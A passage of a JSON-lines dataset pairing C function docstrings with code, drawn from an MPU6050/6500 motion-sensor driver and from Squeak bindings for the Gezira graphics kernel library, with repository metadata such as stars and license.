0xFF;\n\tst.chip_cfg.clk_src = INV_CLK_PLL;\n\tmpu_set_gyro_fsr(gyro_fsr);\n\tmpu_set_accel_fsr(accel_fsr);\n\tmpu_set_lpf(lpf);\n\tmpu_set_sample_rate(sample_rate);\n\tmpu_set_sensors(sensors_on);\n\tmpu_configure_fifo(fifo_sensors);\n\n\tif (dmp_was_on)\n\t\tmpu_set_dmp_state(1);\n\n\treturn result;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Set digital low pass filter.\n *  The following LPF settings are supported: 188, 98, 42, 20, 10, 5.\n *  @param[in]  lpf Desired LPF setting.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_set_lpf(uint16_t lpf)", "code": "{\n\tuint8_t data;\n\n\tif (!(st.chip_cfg.sensors))\n\t\treturn 1;\n\n\tif (lpf >= 188)\n\t\tdata = INV_FILTER_188HZ;\n\telse if (lpf >= 98)\n\t\tdata = INV_FILTER_98HZ;\n\telse if (lpf >= 42)\n\t\tdata = INV_FILTER_42HZ;\n\telse if (lpf >= 20)\n\t\tdata = INV_FILTER_20HZ;\n\telse if (lpf >= 10)\n\t\tdata = INV_FILTER_10HZ;\n\telse\n\t\tdata = INV_FILTER_5HZ;\n\n\tif (st.chip_cfg.lpf == data)\n\t\treturn 0;\n\tif (i2c_write(st.hw->addr, st.reg->lpf, 1, &data))\n\t\treturn 1;\n\tst.chip_cfg.lpf = data;\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Turn specific sensors on/off.\n *  @e sensors can contain a combination of the following flags:\n *  \\n INV_X_GYRO, INV_Y_GYRO, INV_Z_GYRO\n *  \\n INV_XYZ_GYRO\n *  \\n INV_XYZ_ACCEL\n *  \\n INV_XYZ_COMPASS\n *  @param[in]  sensors    Mask of sensors to wake.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_set_sensors(uint8_t sensors)", "code": "{\n\tuint8_t data;\n#ifdef AK89xx_SECONDARY\n\tuint8_t user_ctrl;\n#endif\n\n\tif (sensors & INV_XYZ_GYRO)\n\t\tdata = INV_CLK_PLL;\n\telse if (sensors)\n\t\tdata = 0;\n\telse\n\t\tdata = BIT_SLEEP;\n\tif (i2c_write(st.hw->addr, st.reg->pwr_mgmt_1, 1, &data))\n\t{\n\t\tst.chip_cfg.sensors = 0;\n\t\treturn 1;\n\t}\n\tst.chip_cfg.clk_src = data & ~BIT_SLEEP;\n\n\tdata = 0;\n\tif (!(sensors & INV_X_GYRO))\n\t\tdata |= BIT_STBY_XG;\n\tif (!(sensors & INV_Y_GYRO))\n\t\tdata |= BIT_STBY_YG;\n\tif (!(sensors & INV_Z_GYRO))\n\t\tdata |= BIT_STBY_ZG;\n\tif (!(sensors & INV_XYZ_ACCEL))\n\t\tdata |= BIT_STBY_XYZA;\n\tif (i2c_write(st.hw->addr, st.reg->pwr_mgmt_2, 1, &data))\n\t{\n\t\tst.chip_cfg.sensors = 0;\n\t\treturn 1;\n\t}\n\n\tif (sensors && (sensors != INV_XYZ_ACCEL))\n\t\t/* Latched interrupts only used in LP accel mode. */\n\t\tmpu_set_int_latched(0);\n\n#ifdef AK89xx_SECONDARY\n#ifdef AK89xx_BYPASS\n\tif (sensors & INV_XYZ_COMPASS)\n\t\tmpu_set_bypass(1);\n\telse\n\t\tmpu_set_bypass(0);\n#else\n\tif (i2c_read(st.hw->addr, st.reg->user_ctrl, 1, &user_ctrl))\n\t\treturn 1;\n\t/* Handle AKM power management. */\n\tif (sensors & INV_XYZ_COMPASS)\n\t{\n\t\tdata = AKM_SINGLE_MEASUREMENT;\n\t\tuser_ctrl |= BIT_AUX_IF_EN;\n\t}\n\telse\n\t{\n\t\tdata = AKM_POWER_DOWN;\n\t\tuser_ctrl &= ~BIT_AUX_IF_EN;\n\t}\n\tif (st.chip_cfg.dmp_on)\n\t\tuser_ctrl |= BIT_DMP_EN;\n\telse\n\t\tuser_ctrl &= ~BIT_DMP_EN;\n\tif (i2c_write(st.hw->addr, st.reg->s1_do, 1, &data))\n\t\treturn 1;\n\t/* Enable/disable I2C master mode. */\n\tif (i2c_write(st.hw->addr, st.reg->user_ctrl, 1, &user_ctrl))\n\t\treturn 1;\n#endif\n#endif\n\n\tst.chip_cfg.sensors = sensors;\n\tst.chip_cfg.lp_accel_mode = 0;\n\tdelay_ms(50);\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Enter low-power accel-only mode.\n *  In low-power accel mode, the chip goes to sleep and only wakes up to sample\n *  the accelerometer at one of the following frequencies:\n *  \\n MPU6050: 1.25Hz, 5Hz, 20Hz, 40Hz\n *  \\n MPU6500: 1.25Hz, 2.5Hz, 5Hz, 10Hz, 20Hz, 40Hz, 80Hz, 160Hz, 320Hz, 640Hz\n *  \\n If the requested rate is not one listed above, the device will be set to\n *  the next highest rate. Requesting a rate above the maximum supported\n *  frequency will result in an error.\n *  \\n To select a fractional wake-up frequency, round down the value passed to\n *  @e rate.\n *  @param[in]  rate        Minimum sampling rate, or zero to disable LP\n *                          accel mode.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_lp_accel_mode(uint8_t rate)", "code": "{\n\tuint8_t tmp[2];\n\n\tif (rate > 40)\n\t\treturn 1;\n\n\tif (!rate)\n\t{\n\t\tmpu_set_int_latched(0);\n\t\ttmp[0] = 0;\n\t\ttmp[1] = BIT_STBY_XYZG;\n\t\tif (i2c_write(st.hw->addr, st.reg->pwr_mgmt_1, 2, tmp))\n\t\t\treturn 1;\n\t\tst.chip_cfg.lp_accel_mode = 0;\n\t\treturn 0;\n\t}\n\t/* For LP accel, we automatically configure the hardware to produce latched\n\t * interrupts. In LP accel mode, the hardware cycles into sleep mode before\n\t * it gets a chance to deassert the interrupt pin; therefore, we shift this\n\t * responsibility over to the MCU.\n\t *\n\t * Any register read will clear the interrupt.\n\t */\n\tmpu_set_int_latched(1);\n#if defined MPU6050\n\ttmp[0] = BIT_LPA_CYCLE;\n\tif (rate == 1)\n\t{\n\t\ttmp[1] = INV_LPA_1_25HZ;\n\t\tmpu_set_lpf(5);\n\t}\n\telse if (rate <= 5)\n\t{\n\t\ttmp[1] = INV_LPA_5HZ;\n\t\tmpu_set_lpf(5);\n\t}\n\telse if (rate <= 20)\n\t{\n\t\ttmp[1] = INV_LPA_20HZ;\n\t\tmpu_set_lpf(10);\n\t}\n\telse\n\t{\n\t\ttmp[1] = INV_LPA_40HZ;\n\t\tmpu_set_lpf(20);\n\t}\n\ttmp[1] = (tmp[1] << 6) | BIT_STBY_XYZG;\n\tif (i2c_write(st.hw->addr, st.reg->pwr_mgmt_1, 2, tmp))\n\t\treturn 1;\n#elif defined MPU6500\n\t/* Set wake frequency. */\n\tif (rate == 1)\n\t\ttmp[0] = INV_LPA_1_25HZ;\n\telse if (rate == 2)\n\t\ttmp[0] = INV_LPA_2_5HZ;\n\telse if (rate <= 5)\n\t\ttmp[0] = INV_LPA_5HZ;\n\telse if (rate <= 10)\n\t\ttmp[0] = INV_LPA_10HZ;\n\telse if (rate <= 20)\n\t\ttmp[0] = INV_LPA_20HZ;\n\telse if (rate <= 40)\n\t\ttmp[0] = INV_LPA_40HZ;\n\telse if (rate <= 80)\n\t\ttmp[0] = INV_LPA_80HZ;\n\telse if (rate <= 160)\n\t\ttmp[0] = INV_LPA_160HZ;\n\telse if (rate <= 320)\n\t\ttmp[0] = INV_LPA_320HZ;\n\telse\n\t\ttmp[0] = INV_LPA_640HZ;\n\tif (i2c_write(st.hw->addr, st.reg->lp_accel_odr, 1, tmp))\n\t\treturn 1;\n\ttmp[0] = BIT_LPA_CYCLE;\n\tif (i2c_write(st.hw->addr, st.reg->pwr_mgmt_1, 1, tmp))\n\t\treturn 1;\n#endif\n\tst.chip_cfg.sensors = INV_XYZ_ACCEL;\n\tst.chip_cfg.clk_src = 0;\n\tst.chip_cfg.lp_accel_mode = 1;\n\tmpu_configure_fifo(0);\n\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Get DMP state.\n *  @param[out] enabled 1 if enabled.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_get_dmp_state(uint8_t *enabled)", "code": "{\n\tenabled[0] = st.chip_cfg.dmp_on;\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Read the MPU interrupt status registers.\n *  @param[out] status  Mask of interrupt bits.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_get_int_status(int16_t *status)", "code": "{\n\tuint8_t tmp[2];\n\tif (!st.chip_cfg.sensors)\n\t\treturn 1;\n\tif (i2c_read(st.hw->addr, st.reg->dmp_int_status, 2, tmp))\n\t\treturn 1;\n\tstatus[0] = (tmp[0] << 8) | tmp[1];\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Read from the DMP memory.\n *  This function prevents I2C reads past the bank boundaries. The DMP memory\n *  is only accessible when the chip is awake.\n *  @param[in]  mem_addr    Memory location (bank << 8 | start address)\n *  @param[in]  length      Number of bytes to read.\n *  @param[out] data        Bytes read from memory.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_read_mem(uint16_t mem_addr, uint16_t length,\n\t\t\t\t\t\t\t\t\t\t uint8_t *data)", "code": "{\n\tuint8_t tmp[2];\n\n\tif (!data)\n\t\treturn 1;\n\tif (!st.chip_cfg.sensors)\n\t\treturn 1;\n\n\ttmp[0] = (uint8_t)(mem_addr >> 8);\n\ttmp[1] = (uint8_t)(mem_addr & 0xFF);\n\n\t/* Check bank boundaries. */\n\tif (tmp[1] + length > st.hw->bank_size)\n\t\treturn 1;\n\n\tif (i2c_write(st.hw->addr, st.reg->bank_sel, 2, tmp))\n\t\treturn 1;\n\tif (i2c_read(st.hw->addr, st.reg->mem_r_w, length, data))\n\t\treturn 1;\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Get compass sampling rate.\n *  @param[out] rate    Current compass sampling rate (Hz).\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_get_compass_sample_rate(uint16_t *rate)", "code": "{\n#ifdef AK89xx_SECONDARY\n\trate[0] = st.chip_cfg.compass_sample_rate;\n\treturn 0;\n#else\n\trate[0] = 0;\n\treturn 1;\n#endif\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Select which sensors are pushed to FIFO.\n *  @e sensors can contain a combination of the following flags:\n *  \\n INV_X_GYRO, INV_Y_GYRO, INV_Z_GYRO\n *  \\n INV_XYZ_GYRO\n *  \\n INV_XYZ_ACCEL\n *  @param[in]  sensors Mask of sensors to push to FIFO.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_configure_fifo(uint8_t sensors)", "code": "{\n\tuint8_t prev;\n\tint result = 0;\n\n\t/* Compass data isn't going into the FIFO. Stop trying. */\n\tsensors &= ~INV_XYZ_COMPASS;\n\n\tif (st.chip_cfg.dmp_on)\n\t\treturn 0;\n\telse\n\t{\n\t\tif (!(st.chip_cfg.sensors))\n\t\t\treturn 1;\n\t\tprev = st.chip_cfg.fifo_enable;\n\t\tst.chip_cfg.fifo_enable = sensors & st.chip_cfg.sensors;\n\t\tif (st.chip_cfg.fifo_enable != sensors)\n\t\t\t/* You're not getting what you asked for. Some sensors are\n\t\t\t * asleep.\n\t\t\t */\n\t\t\tresult = -1;\n\t\telse\n\t\t\tresult = 0;\n\t\tif (sensors || st.chip_cfg.lp_accel_mode)\n\t\t\tset_int_enable(1);\n\t\telse\n\t\t\tset_int_enable(0);\n\t\tif (sensors)\n\t\t{\n\t\t\tif (mpu_reset_fifo())\n\t\t\t{\n\t\t\t\tst.chip_cfg.fifo_enable = prev;\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t}\n\n\treturn result;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Get the accel full-scale range.\n *  @param[out] fsr Current full-scale range.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_get_accel_fsr(uint8_t *fsr)", "code": "{\n\tswitch (st.chip_cfg.accel_fsr)\n\t{\n\tcase INV_FSR_2G:\n\t\tfsr[0] = 2;\n\t\tbreak;\n\tcase INV_FSR_4G:\n\t\tfsr[0] = 4;\n\t\tbreak;\n\tcase INV_FSR_8G:\n\t\tfsr[0] = 8;\n\t\tbreak;\n\tcase INV_FSR_16G:\n\t\tfsr[0] = 16;\n\t\tbreak;\n\tdefault:\n\t\treturn 1;\n\t}\n\tif (st.chip_cfg.accel_half)\n\t\tfsr[0] <<= 1;\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Set sampling rate.\n *  Sampling rate must be between 4Hz and 1kHz.\n *  @param[in]  rate    Desired sampling rate (Hz).\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_set_sample_rate(uint16_t rate)", "code": "{\n\tuint8_t data;\n\n\tif (!(st.chip_cfg.sensors))\n\t\treturn 1;\n\n\tif (st.chip_cfg.dmp_on)\n\t\treturn 1;\n\telse\n\t{\n\t\tif (st.chip_cfg.lp_accel_mode)\n\t\t{\n\t\t\tif (rate && (rate <= 40))\n\t\t\t{\n\t\t\t\t/* Just stay in low-power accel mode. */\n\t\t\t\tmpu_lp_accel_mode(rate);\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\t/* Requested rate exceeds the allowed frequencies in LP accel mode,\n\t\t\t * switch back to full-power mode.\n\t\t\t */\n\t\t\tmpu_lp_accel_mode(0);\n\t\t}\n\t\tif (rate < 4)\n\t\t\trate = 4;\n\t\telse if (rate > 1000)\n\t\t\trate = 1000;\n\n\t\tdata = 1000 / rate - 1;\n\t\tif (i2c_write(st.hw->addr, st.reg->rate_div, 1, &data))\n\t\t\treturn 1;\n\n\t\tst.chip_cfg.sample_rate = 1000 / (1 + data);\n\n#ifdef AK89xx_SECONDARY\n\t\tmpu_set_compass_sample_rate(min(st.chip_cfg.compass_sample_rate, MAX_COMPASS_SAMPLE_RATE));\n#endif\n\n\t\t/* Automatically set LPF to 1/2 sampling rate. */\n\t\tmpu_set_lpf(st.chip_cfg.sample_rate >> 1);\n\t\treturn 0;\n\t}\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Set the gyro full-scale range.\n *  @param[in]  fsr Desired full-scale range.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_set_gyro_fsr(uint16_t fsr)", "code": "{\n\tuint8_t data;\n\n\tif (!(st.chip_cfg.sensors))\n\t\treturn 1;\n\n\tswitch (fsr)\n\t{\n\tcase 250:\n\t\tdata = INV_FSR_250DPS << 3;\n\t\tbreak;\n\tcase 500:\n\t\tdata = INV_FSR_500DPS << 3;\n\t\tbreak;\n\tcase 1000:\n\t\tdata = INV_FSR_1000DPS << 3;\n\t\tbreak;\n\tcase 2000:\n\t\tdata = INV_FSR_2000DPS << 3;\n\t\tbreak;\n\tdefault:\n\t\treturn 1;\n\t}\n\n\tif (st.chip_cfg.gyro_fsr == (data >> 3))\n\t\treturn 0;\n\tif (i2c_write(st.hw->addr, st.reg->gyro_cfg, 1, &data))\n\t\treturn 1;\n\tst.chip_cfg.gyro_fsr = data >> 3;\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Set device to bypass mode.\n *  @param[in]  bypass_on   1 to enable bypass mode.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_set_bypass(uint8_t bypass_on)", "code": "{\n\tuint8_t tmp;\n\n\tif (st.chip_cfg.bypass_mode == bypass_on)\n\t\treturn 0;\n\n\tif (bypass_on)\n\t{\n\t\tif (i2c_read(st.hw->addr, st.reg->user_ctrl, 1, &tmp))\n\t\t\treturn 1;\n\t\ttmp &= ~BIT_AUX_IF_EN;\n\t\tif (i2c_write(st.hw->addr, st.reg->user_ctrl, 1, &tmp))\n\t\t\treturn 1;\n\t\tdelay_ms(3);\n\t\ttmp = BIT_BYPASS_EN;\n\t\tif (st.chip_cfg.active_low_int)\n\t\t\ttmp |= BIT_ACTL;\n\t\tif (st.chip_cfg.latched_int)\n\t\t\ttmp |= BIT_LATCH_EN | BIT_ANY_RD_CLR;\n\t\tif (i2c_write(st.hw->addr, st.reg->int_pin_cfg, 1, &tmp))\n\t\t\treturn 1;\n\t}\n\telse\n\t{\n\t\t/* Enable I2C master mode if compass is being used. */\n\t\tif (i2c_read(st.hw->addr, st.reg->user_ctrl, 1, &tmp))\n\t\t\treturn 1;\n\t\tif (st.chip_cfg.sensors & INV_XYZ_COMPASS)\n\t\t\ttmp |= BIT_AUX_IF_EN;\n\t\telse\n\t\t\ttmp &= ~BIT_AUX_IF_EN;\n\t\tif (i2c_write(st.hw->addr, st.reg->user_ctrl, 1, &tmp))\n\t\t\treturn 1;\n\t\tdelay_ms(3);\n\t\tif (st.chip_cfg.active_low_int)\n\t\t\ttmp = BIT_ACTL;\n\t\telse\n\t\t\ttmp = 0;\n\t\tif (st.chip_cfg.latched_int)\n\t\t\ttmp |= BIT_LATCH_EN | BIT_ANY_RD_CLR;\n\t\tif (i2c_write(st.hw->addr, st.reg->int_pin_cfg, 1, &tmp))\n\t\t\treturn 1;\n\t}\n\tst.chip_cfg.bypass_mode = bypass_on;\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Enable latched interrupts.\n *  Any MPU register will clear the interrupt.\n *  @param[in]  enable  1 to enable, 0 to disable.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_set_int_latched(uint8_t enable)", "code": "{\n\tuint8_t tmp;\n\tif (st.chip_cfg.latched_int == enable)\n\t\treturn 0;\n\n\tif (enable)\n\t\ttmp = BIT_LATCH_EN | BIT_ANY_RD_CLR;\n\telse\n\t\ttmp = 0;\n\tif (st.chip_cfg.bypass_mode)\n\t\ttmp |= BIT_BYPASS_EN;\n\tif (st.chip_cfg.active_low_int)\n\t\ttmp |= BIT_ACTL;\n\tif (i2c_write(st.hw->addr, st.reg->int_pin_cfg, 1, &tmp))\n\t\treturn 1;\n\tst.chip_cfg.latched_int = enable;\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelGaussianBlur11x1size(sqInt*argOops, sqInt argCount)", "code": "{\n\tfloat f;\n\tnile_Process_t*result;\n\tnile_Process_t* t;\n\n\tif (argCount != 1) {\n\t\tfail(\"wrong argument count in GaussianBlur11x1\"); return;\n\t}\n\t/* begin popKernel */\n\tif (!(stackP > 0)) {\n\t\tfail(\"kernel stack underflow\");\n\t\tt = null;\n\t\tgoto l1;\n\t}\n\tstackP -= 1;\n\tt = stack[stackP];\nl1:\t/* end popKernel */;\n\tf = interpreterProxy->floatValueOf(argOops[0]);\n\tif (interpreterProxy->failed()) {\n\t\tfail(\"wrong arguments to GaussianBlur11x1\"); return;\n\t}\n\tresult = gezira_GaussianBlur11x1(init, f, t);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l2;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl2:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelCompositeDstOversize(sqInt*argOops, sqInt argCount)", "code": "{\n\tnile_Process_t*result;\n\n\tif (argCount != 0) {\n\t\tfail(\"wrong argument count in CompositeDstOver\"); return;\n\t}\n\tresult = gezira_CompositeDstOver(init);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tArgument is an integer, pops n kernels */\n", "func_signal": "static void kernelPipelinesize(sqInt*argOops, sqInt argCount)", "code": "{\n\tsqInt n;\n\tnile_Process_t** v;\n\tnile_Process_t*result;\n\n\tif (argCount != 1) {\n\t\tfail(\"wrong kernel argument count in Pipeline\"); return;\n\t}\n\tn = interpreterProxy->checkedIntegerValueOf(argOops[0]);\n\t/* begin popKernels: */\n\tif (!(stackP >= n)) {\n\t\tfail(\"kernel stack underflow\");\n\t\tv = null;\n\t\tgoto l1;\n\t}\n\tstackP -= n;\n\tv = stack + stackP;\nl1:\t/* end popKernels: */;\n\tif (interpreterProxy->failed()) {\n\t\treturn;\n\t}\n\tresult = nile_Process_pipe_v (v, n);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l2;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl2:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelCompositeHardLightsize(sqInt*argOops, sqInt argCount)", "code": "{\n\tnile_Process_t*result;\n\n\tif (argCount != 0) {\n\t\tfail(\"wrong argument count in CompositeHardLight\"); return;\n\t}\n\tresult = gezira_CompositeHardLight(init);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelGaussianBlur1x11size(sqInt*argOops, sqInt argCount)", "code": "{\n\tfloat f;\n\tnile_Process_t*result;\n\tnile_Process_t* t;\n\n\tif (argCount != 1) {\n\t\tfail(\"wrong argument count in GaussianBlur1x11\"); return;\n\t}\n\t/* begin popKernel */\n\tif (!(stackP > 0)) {\n\t\tfail(\"kernel stack underflow\");\n\t\tt = null;\n\t\tgoto l1;\n\t}\n\tstackP -= 1;\n\tt = stack[stackP];\nl1:\t/* end popKernel */;\n\tf = interpreterProxy->floatValueOf(argOops[0]);\n\tif (interpreterProxy->failed()) {\n\t\tfail(\"wrong arguments to GaussianBlur1x11\"); return;\n\t}\n\tresult = gezira_GaussianBlur1x11(init, f, t);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l2;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl2:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tCheck, round and store the result of a rectangle operation */\n", "func_signal": "static sqInt storeRectanglex0y0x1y1(sqInt dstOop, double  x0, double  y0, double  x1, double  y1)", "code": "{\n\tsqInt originOop;\n\tsqInt cornerOop;\n\tsqInt rectOop;\n\n\tinterpreterProxy->pushRemappableOop(dstOop);\n\toriginOop = makePointand(x0, y0);\n\tinterpreterProxy->pushRemappableOop(originOop);\n\tcornerOop = makePointand(x1, y1);\n\toriginOop = interpreterProxy->popRemappableOop();\n\trectOop = interpreterProxy->popRemappableOop();\n\tinterpreterProxy->storePointerofObjectwithValue(0, rectOop, originOop);\n\tinterpreterProxy->storePointerofObjectwithValue(1, rectOop, cornerOop);\n\treturn rectOop;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelReflectTexturesize(sqInt*argOops, sqInt argCount)", "code": "{\n\tnile_Process_t*result;\n\tfloat dX;\n\tfloat dY;\n\n\tif (argCount != 2) {\n\t\tfail(\"wrong argument count in ReflectTexture\"); return;\n\t}\n\tdX = interpreterProxy->floatValueOf(argOops[0]);\n\tdY = interpreterProxy->floatValueOf(argOops[1]);\n\tif (interpreterProxy->failed()) {\n\t\tfail(\"wrong arguments to ReflectTexture\"); return;\n\t}\n\tresult = gezira_ReflectTexture(init, dX, dY);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelCompositeDstsize(sqInt*argOops, sqInt argCount)", "code": "{\n\tnile_Process_t*result;\n\n\tif (argCount != 0) {\n\t\tfail(\"wrong argument count in CompositeDst\"); return;\n\t}\n\tresult = gezira_CompositeDst(init);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tArgument is a Form */\n", "func_signal": "static void kernelWriteToImageARGB32size(sqInt*argOops, sqInt argCount)", "code": "{\n\tgezira_Image_t*image;\n\tnile_Process_t*result;\n\n\tif (argCount != 1) {\n\t\tfail(\"wrong kernel argument count in WriteToImageARGB32\"); return;\n\t}\n\timage = imageFromForm(argOops[0]);\n\tif (interpreterProxy->failed()) {\n\t\treturn;\n\t}\n\tresult = gezira_WriteToImage_ARGB32 (init, image);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelCompositeSubtractsize(sqInt*argOops, sqInt argCount)", "code": "{\n\tnile_Process_t*result;\n\n\tif (argCount != 0) {\n\t\tfail(\"wrong argument count in CompositeSubtract\"); return;\n\t}\n\tresult = gezira_CompositeSubtract(init);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
